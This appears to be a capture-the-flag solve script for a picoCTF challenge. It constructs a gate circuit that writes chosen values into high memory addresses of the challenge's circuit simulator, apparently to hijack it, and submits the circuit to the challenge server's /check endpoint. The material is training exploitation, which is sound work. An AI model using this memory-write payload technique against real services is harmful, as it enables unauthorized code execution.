import requests

IN1, IN2, IN3, IN4 = range(5, 9)
OUT1, OUT2, OUT3, OUT4 = range(1, 5)

def con(a: int, b: int, o: int):
    return { "input1": a, "input2": b, "output": o }

def num(n: int, const: int, dest: int):
    r = []
    for b in f"{n:0b}"[1:]:
        r.append(con(dest, dest, dest))
        if b == "1":
            r.append(con(0 + const, dest, dest))
    return r

def write(base: int, addr: int, n: int):
    total = base - 4 + addr.bit_length() + addr.bit_count() + n.bit_length() + n.bit_count()
    total *= 3
    const = total + 3
    r = [
        *num(addr, 0x800 + const, 0x800 + total + 2),
        *num(n, 0x800 + const, 0x800 + const + 1),
        con(0xff0, 0x800 + const + 1, 1),
        con(1, 1, 1),
    ]
    return r

A = 0
B = A + 6
TARGET = A + 10 * 3

circ= [
    con(0xfff, 0xfff, 0xfff),
    con(0xfff, 0xfff, 0xfff),
    con(0x22, 0x101, 0x101),
    con(0x800 + A + 0, 0x800 + A + 1, 0x800 + TARGET + 2),
    con(0x800 + A + 2, 0x800 + A + 3, 0x800 + TARGET + 2),

    con(0x800 + A + 4, 0x800 + A + 5, 0x800 + TARGET + 2),
    con(0x800 + TARGET + 2, 0x800 + TARGET + 2, 0x800 + TARGET + 2),
    con(0x800 + B + 0, 0x800 + B + 0, 0x800 + B + 0),
    con(0x800 + TARGET + 2, 0x800 + B + 0, 0x800 + TARGET + 2),
    con(0x800 + B + 1, 0x800 + B + 1, 0x800 + B + 2),

    con(0x800 + B + 2, 0x800 + B + 2, 1),
]
circ.extend(write(len(circ), 0xf000 + 38, 0x0d))
circ.extend(write(len(circ), 0xf000 + 39, 0x6f73))
circ.extend(write(len(circ), 0xf000 + 40, 0x1d))
circ.extend(write(len(circ), 0xf000 + 41, 0x6563))
circ.extend(write(len(circ), 0xf000 + 42, 0x2d))
circ.extend(write(len(circ), 0xf000 + 43, 0x2e69))
circ.extend(write(len(circ), 0xf000 + 44, 0x3d))
circ.extend(write(len(circ), 0xf000 + 45, 0x6f00))
circ.extend(write(len(circ), 0xf000 + 46, 0x0e))
circ.extend(write(len(circ), 0xf000 + 47, 0x0f))

HOST = "http://activist-birds.picoctf.net:50294"
res = requests.post(f"{HOST}/check", json={
    "circuit": circ
})
print(res.status_code)
print(res.text)
print(res.json())
